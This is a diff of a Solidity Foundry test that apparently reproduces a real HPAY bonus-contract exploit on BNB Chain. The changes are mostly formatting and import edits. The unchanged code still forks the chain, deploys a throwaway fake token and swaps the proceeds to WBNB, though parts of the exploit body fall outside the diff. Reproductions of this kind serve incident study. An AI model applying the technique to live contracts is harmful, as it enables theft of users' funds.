@@ -2,7 +2,12 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
+
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+
+import {IWBNB} from "src/interfaces/IWBNB.sol";
+
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 
 // @KeyInfo - Total Lost : ~115 BNB
 // Attacker : 0xaB74FBd735Cd2ED826b64e0F850a890930A91094
@@ -23,20 +28,22 @@ import "./../interface.sol";
 // ACai Article (in Chinese) : https://www.cnblogs.com/ACaiGarden/p/16872933.html
 
 interface IMintableAutoCompundRelockBonus {
-
     function setToken(address) external;
     function stake(uint256) external;
     function withdraw(uint256) external;
-
 }
 
 contract ContractTest is Test {
-
-    IERC20 constant HPAY_TOKEN = IERC20(0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A);
-    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IERC20 constant HPAY_TOKEN =
+        IERC20(0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A);
+    IWBNB constant WBNB_TOKEN =
+        IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+    IUniswapV2Router constant PS_ROUTER =
+        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IMintableAutoCompundRelockBonus constant BONUS =
-        IMintableAutoCompundRelockBonus(0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0);
+        IMintableAutoCompundRelockBonus(
+            0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0
+        );
 
     function setUp() public {
         vm.createSelectFork("bsc", 22_280_853);
@@ -47,15 +54,23 @@ contract ContractTest is Test {
         vm.label(address(BONUS), "BONUS");
         vm.label(0xE9bc03Ef08E991a99F1bd095a8590499931DcC30, "BONUS_IMPL");
         vm.label(0xa0A1E7571F938CC33daD497849F14A0c98B30FD0, "WBNB_HPAY_PAIR");
-        vm.label(0xc16e351751e63A34F44908b065Fc8Be592D564dE, "HPAY_RewardManager");
-        vm.label(0xf88daA7723f118EfB4416a0DfD129e005CA9166F, "HPAY_RewardManager_Impl");
+        vm.label(
+            0xc16e351751e63A34F44908b065Fc8Be592D564dE,
+            "HPAY_RewardManager"
+        );
+        vm.label(
+            0xf88daA7723f118EfB4416a0DfD129e005CA9166F,
+            "HPAY_RewardManager_Impl"
+        );
         vm.label(0x45b10a3C39DE271D8edc23796970acF8832C20ff, "HPAY_Fund");
         vm.label(0x346abB57CfB43aD3Bb8210E3DD1dB12353160A0b, "HPAY_FeeManager");
     }
 
     function testExploit() external {
         emit log_named_decimal_uint(
-            "[Start] Attacker WBNB balance before exploit", WBNB_TOKEN.balanceOf(address(this)), 18
+            "[Start] Attacker WBNB balance before exploit",
+            WBNB_TOKEN.balanceOf(address(this)),
+            18
         );
 
         HPAY_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
@@ -79,7 +94,9 @@ contract ContractTest is Test {
         _HPAYToWBNB();
 
         emit log_named_decimal_uint(
-            "[End] Attacker WBNB balance after exploit", WBNB_TOKEN.balanceOf(address(this)), 18
+            "[End] Attacker WBNB balance after exploit",
+            WBNB_TOKEN.balanceOf(address(this)),
+            18
         );
     }
 
@@ -91,14 +108,16 @@ contract ContractTest is Test {
         path[0] = address(HPAY_TOKEN);
         path[1] = address(WBNB_TOKEN);
         PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            HPAY_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
+            HPAY_TOKEN.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
     }
-
 }
 
 contract SHITCOIN {
-
     uint256 public totalSupply;
     mapping(address => uint256) public balanceOf;
     mapping(address => mapping(address => uint256)) public allowance;
@@ -107,9 +126,16 @@ contract SHITCOIN {
     uint8 public decimals = 18;
 
     event Transfer(address indexed from, address indexed to, uint256 value);
-    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
 
-    function transfer(address recipient, uint256 amount) external returns (bool) {
+    function transfer(
+        address recipient,
+        uint256 amount
+    ) external returns (bool) {
         balanceOf[msg.sender] -= amount;
         balanceOf[recipient] += amount;
         emit Transfer(msg.sender, recipient, amount);
@@ -122,7 +148,11 @@ contract SHITCOIN {
         return true;
     }
 
-    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool) {
         allowance[sender][msg.sender] -= amount;
         balanceOf[sender] -= amount;
         balanceOf[recipient] += amount;
@@ -141,5 +171,4 @@ contract SHITCOIN {
         totalSupply -= amount;
         emit Transfer(msg.sender, address(0), amount);
     }
-
 }
